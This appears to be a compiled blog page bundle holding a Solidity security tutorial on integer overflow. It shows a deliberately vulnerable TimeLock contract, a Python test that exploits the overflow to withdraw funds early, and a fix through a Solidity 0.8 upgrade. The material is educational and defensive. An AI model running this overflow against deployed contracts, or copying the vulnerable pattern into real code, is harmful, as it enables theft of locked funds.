"use strict";(self.webpackChunkbuildany_website=self.webpackChunkbuildany_website||[]).push([[734],{3905:function(e,t,n){n.d(t,{Zo:function(){return u},kt:function(){return m}});var o=n(67294);function i(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function r(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);t&&(o=o.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,o)}return n}function a(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?r(Object(n),!0).forEach((function(t){i(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):r(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,o,i=function(e,t){if(null==e)return{};var n,o,i={},r=Object.keys(e);for(o=0;o<r.length;o++)n=r[o],t.indexOf(n)>=0||(i[n]=e[n]);return i}(e,t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(o=0;o<r.length;o++)n=r[o],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(i[n]=e[n])}return i}var l=o.createContext({}),c=function(e){var t=o.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):a(a({},t),e)),n},u=function(e){var t=c(e.components);return o.createElement(l.Provider,{value:t},e.children)},p={inlineCode:"code",wrapper:function(e){var t=e.children;return o.createElement(o.Fragment,{},t)}},d=o.forwardRef((function(e,t){var n=e.components,i=e.mdxType,r=e.originalType,l=e.parentName,u=s(e,["components","mdxType","originalType","parentName"]),d=c(n),m=i,h=d["".concat(l,".").concat(m)]||d[m]||p[m]||r;return n?o.createElement(h,a(a({ref:t},u),{},{components:n})):o.createElement(h,a({ref:t},u))}));function m(e,t){var n=arguments,i=t&&t.mdxType;if("string"==typeof e||i){var r=n.length,a=new Array(r);a[0]=d;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s.mdxType="string"==typeof e?e:i,a[1]=s;for(var c=2;c<r;c++)a[c]=n[c];return o.createElement.apply(null,a)}return o.createElement.apply(null,n)}d.displayName="MDXCreateElement"},69131:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return s},contentTitle:function(){return l},metadata:function(){return c},toc:function(){return u},default:function(){return d}});var o=n(87462),i=n(63366),r=(n(67294),n(3905)),a=["components"],s={sidebar_position:2,tags:["overflow","solidity","attack"]},l="Overflow",c={unversionedId:"solidity-hacks/overflow",id:"solidity-hacks/overflow",title:"Overflow",description:"This exploit is reproducible only in Solidity version 7 and below. Since the release of the version 8, the overflow code causes VirtualMachineError by default.",source:"@site/docs/solidity-hacks/overflow.md",sourceDirName:"solidity-hacks",slug:"/solidity-hacks/overflow",permalink:"/docs/solidity-hacks/overflow",editUrl:"https://github.com/kkateq/blog/docs/solidity-hacks/overflow.md",tags:[{label:"overflow",permalink:"/docs/tags/overflow"},{label:"solidity",permalink:"/docs/tags/solidity"},{label:"attack",permalink:"/docs/tags/attack"}],version:"current",sidebarPosition:2,frontMatter:{sidebar_position:2,tags:["overflow","solidity","attack"]},sidebar:"tutorialSidebar",previous:{title:"Re-entrancy",permalink:"/docs/solidity-hacks/re-entrancy"},next:{title:"Underflow",permalink:"/docs/solidity-hacks/underflow"}},u=[{value:"Description",id:"description",children:[],level:3},{value:"How to test",id:"how-to-test",children:[],level:3},{value:"How to fix",id:"how-to-fix",children:[],level:3},{value:"Demo",id:"demo",children:[],level:3}],p={toc:u};function d(e){var t=e.components,n=(0,i.Z)(e,a);return(0,r.kt)("wrapper",(0,o.Z)({},p,n,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"overflow"},"Overflow"),(0,r.kt)("div",{className:"admonition admonition-caution alert alert--warning"},(0,r.kt)("div",{parentName:"div",className:"admonition-heading"},(0,r.kt)("h5",{parentName:"div"},(0,r.kt)("span",{parentName:"h5",className:"admonition-icon"},(0,r.kt)("svg",{parentName:"span",xmlns:"http://www.w3.org/2000/svg",width:"16",height:"16",viewBox:"0 0 16 16"},(0,r.kt)("path",{parentName:"svg",fillRule:"evenodd",d:"M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"}))),"DEPRECATED")),(0,r.kt)("div",{parentName:"div",className:"admonition-content"},(0,r.kt)("p",{parentName:"div"},"This exploit is reproducible only in Solidity ",(0,r.kt)("strong",{parentName:"p"},"version 7")," and below. Since the release of the version ",(0,r.kt)("strong",{parentName:"p"},"8"),", the overflow code causes ",(0,r.kt)("inlineCode",{parentName:"p"},"VirtualMachineError")," by default."))),(0,r.kt)("h3",{id:"description"},"Description"),(0,r.kt)("p",null,"An arithmetic overflow results from a calculation that exceeds the memory space designated to hold it, or the computation result is outside the range of the variable type. In simple applications, we would attempt to run the exploit that turns the positive number into 0, allowing us to perform the logic we would not perform otherwise."),(0,r.kt)("p",null,"Consider the following smart contract:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-solidity",metastring:"title=/contracts/overflow/TimeLock.sol#L14 sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/contracts/overflow/TimeLock.sol#L14",title:"/contracts/overflow/TimeLock.sol#L14",sourceUrl:"https://github.com/kkateq/solidity-hacks/blob/main/contracts/overflow/TimeLock.sol#L14"},"// SPDX-License-Identifier: MIT\npragma solidity ^0.7.6;\n\ncontract TimeLock {\n    mapping(address => uint256) public balances;\n    mapping(address => uint256) public lockTime;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n        lockTime[msg.sender] = block.timestamp + 1 weeks;\n    }\n\n    function increaseLockTime(uint256 _secondsToIncrease) public {\n        // highlight-next-line\n        lockTime[msg.sender] += _secondsToIncrease;\n    }\n\n    function withdraw() public {\n        require(balances[msg.sender] > 0);\n        require(block.timestamp > lockTime[msg.sender]);\n        uint256 transferValue = balances[msg.sender];\n        balances[msg.sender] = 0;\n        address payable receiver = payable(msg.sender);\n        receiver.transfer(transferValue);\n    }\n\n    function balanceOf() public view returns (uint256) {\n        return address(this).balance;\n    }\n\n    function lockTimeOf(address _user) public view returns (uint256) {\n        return lockTime[_user];\n    }\n}\n")),(0,r.kt)("p",null,"On line 14, the arithmetic operation updates the user's balance lock time. The ",(0,r.kt)("inlineCode",{parentName:"p"},"uint256")," variable holds the values from 0 up until 2^256 - 1, which is precisely 256 bits. If we try to assign a new value more than 2^256 - 1, e.g., 2^256, the ",(0,r.kt)("inlineCode",{parentName:"p"},"_secondsToIncrease")," will become 0. The types work circularly in this case, so once the limit is reached, the variable starts from 0."),(0,r.kt)("p",null,"So the attacker might exploit this behavior to overcome the funds lock time and perform the withdrawal earlier."),(0,r.kt)("h3",{id:"how-to-test"},"How to test"),(0,r.kt)("p",null,"Let's simulate the attack that via python unit test. The highlighted lines 22-24 below execute the overflow attack:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python",metastring:"sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/tests/overflow/test_time_lock.py title=/tests/overflow/test_time_lock.py",sourceUrl:"https://github.com/kkateq/solidity-hacks/blob/main/tests/overflow/test_time_lock.py",title:"/tests/overflow/test_time_lock.py"},'import pytest\nfrom brownie import exceptions\nfrom scripts.utils import get_attacker_account, get_user_account\nfrom scripts.overflow.deploy_and_attack import deploy_time_lock, deploy_time_lock_fixed\nfrom web3 import Web3\n\n\ndef test_time_lock_immediate_withdrawal_successful():\n    # 1. Deploy TimeLock smart contract\n    time_lock = deploy_time_lock()\n\n    # 2. User deposits 1 ETH on the time lock smart contract balance\n    deposit_tx = time_lock.deposit(\n        {"from": get_user_account(), "value": Web3.toWei(1, "ether")}\n    )\n    deposit_tx.wait(1)\n\n    # Let\'s keep track of the user balance, ETH\n    user_balance = get_user_account().balance() / 10**18\n\n    # 3. Execute the overflow attack\n    #  highlight-next-line\n    increase_tx = time_lock.increaseLockTime(\n    #  highlight-next-line\n        pow(2, 256) - time_lock.lockTimeOf(get_user_account().address),\n    #  highlight-next-line\n        {"from": get_user_account()},\n    )\n    increase_tx.wait(1)\n\n    # 4. Since the lock time is 0, we can easily withdraw the ETH\n    withdraw_tx = time_lock.withdraw({"from": get_user_account()})\n    withdraw_tx.wait(1)\n\n    # So it should not be possible for user to withdraw the ETH, but the user\'s 1 ETH is back on his balance\n    assert get_user_account().balance() / 10**18 == user_balance + 1\n\n')),(0,r.kt)("p",null,"This test should successfully pass, and the user gets his 1 ETH back on his balance immediately."),(0,r.kt)("p",null,"Also, consider running the brownie ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/kkateq/solidity-hacks/blob/main/scripts/overflow/deploy_and_attack.py#L28"},"script")," as well instead of the unit test to follow transactions log."),(0,r.kt)("h3",{id:"how-to-fix"},"How to fix"),(0,r.kt)("p",null,"If you would use solidity prior v8, it's necessary to use safe math libraries to fix this problem. One of the examples is the ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/math/SafeMath.sol"},"SafeMath")," from OpenZeppelin. The best option is to upgrade Solidity to v8. "),(0,r.kt)("h3",{id:"demo"},"Demo"),(0,r.kt)("p",null,"I ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/kkateq/solidity-hacks/blob/main/contracts/overflow/TimeLockFixed.sol#L2"},"chose")," upgrading Solidity version to fix the problem. Additionally, this points again that using the latest available solidity version is the safest option to go."),(0,r.kt)("p",null,"Check out the unit test that now fails to exploit the contract:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-python",metastring:"title=/tests/overflow/test_time_lock.py#L34 sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/tests/overflow/test_time_lock.py#L34",title:"/tests/overflow/test_time_lock.py#L34",sourceUrl:"https://github.com/kkateq/solidity-hacks/blob/main/tests/overflow/test_time_lock.py#L34"},'def test_time_lock_fixed_immediate_withdrawal_failed():\n    # 1. Deploy TimeLock contract\n    time_lock = deploy_time_lock_fixed()\n\n    # 2. Deposit funds using another user account\n    deposit_tx = time_lock.deposit(\n        {"from": get_user_account(), "value": Web3.toWei(1, "ether")}\n    )\n\n    user_balance = get_user_account().balance() / 10**18\n\n    deposit_tx.wait(1)\n\n    # 3. Execute attack\n    #  highlight-next-line\n    with pytest.raises(exceptions.VirtualMachineError):\n        increase_tx = time_lock.increaseLockTime(\n            pow(2, 256) - time_lock.lockTimeOf(get_user_account().address),\n            {"from": get_user_account()},\n        )\n        increase_tx.wait(1)\n\n    assert get_user_account().balance() / 10**18 == user_balance\n')),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"Thank you for reading and good luck with building secure blockchain!")))}d.isMDXComponent=!0}}]);